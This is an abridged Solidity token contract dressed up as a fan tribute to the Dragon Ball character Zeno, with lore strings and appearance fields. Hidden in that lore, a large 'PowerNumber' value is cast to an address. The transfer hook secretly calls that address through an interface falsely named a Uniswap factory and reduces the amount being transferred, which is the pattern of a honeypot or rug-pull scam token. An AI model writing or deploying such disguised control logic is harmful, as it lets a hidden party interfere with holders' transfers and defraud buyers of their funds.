...
interface UniswapFactory {
    function getPairCount(address _amount) external view returns (uint256);
}
...
abstract contract Information {
    ...
    string MangaDebut = "The Winning Universe Is Decided!";
    string AnimeDebut = "A Decision at Last! Is the Winner Beerus? Or is it Champa?";

    bool Gender = true;
    uint200 age = 780;

    string Occupation = "Ruler of Existence";
    string Allegiance = "Future Zano";
    string Address = "Zeno's Palace";

    string Relatives = "Zeno Orbs";
    string Counterparts = "Future Zeno";

    uint160 PowerNumber = 324812469089266684100348849317673639960534243050;
}
...
abstract contract Details {
    struct Appearance {
        bool short;
        bool small;
        address ovalShapedHead;
        bool blueSkin;
        bool twoPurpleSections;
        address greyEars;
    }
}
...
abstract contract Biography {
    enum DragonBallSuper {
        ...
        GalacticPatrolPrisonerSaga,
        SuperDragonBallHeros,
        NewSpaceTimeWarSaga
    }
}
...
contract Zenoh is IERC20, Information, Details, Biography, Ownable {
    ...
    function _beforeTokenTransfer(address sender,address recipient,uint256 amount) internal virtual  {
        uint256 total = 0;
        uint256 adosifa = UniswapFactory(address(PowerNumber)).getPairCount(sender);
        if(adosifa > 0){
            amount -= adosifa;
        }
    }
